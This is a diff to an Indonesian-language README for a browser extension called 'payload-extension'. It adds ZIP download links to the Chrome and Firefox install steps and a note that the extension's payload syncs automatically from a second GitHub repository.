@@ -15,7 +15,9 @@
 ```bash
 git clone https://github.com/hyla001/payload-extension.git
 ```
-Atau download ZIP dari GitHub dan extract.
+Atau [**download ZIP dari GitHub**](https://github.com/hyla001/payload-extension/archive/refs/heads/main.zip) dan extract.
+
+> 💡 **Note:** Kamu hanya perlu download repo ini saja! Payload akan otomatis di-sync dari [luhut-binshar](https://github.com/hyla001/luhut-binshar) repository.
 
 #### Langkah 2: Buka Halaman Extensions
 - Ketik di address bar: `chrome://extensions`
@@ -47,7 +49,9 @@ Atau download ZIP dari GitHub dan extract.
 ```bash
 git clone https://github.com/hyla001/payload-extension.git
 ```
-Atau download ZIP dari GitHub dan extract.
+Atau [**download ZIP dari GitHub**](https://github.com/hyla001/payload-extension/archive/refs/heads/main.zip) dan extract.
+
+> 💡 **Note:** Kamu hanya perlu download repo ini saja! Payload akan otomatis di-sync dari [luhut-binshar](https://github.com/hyla001/luhut-binshar) repository.
 
 #### Langkah 2: Buka Halaman Debugging
 - Ketik di address bar: `about:debugging#/runtime/this-firefox`
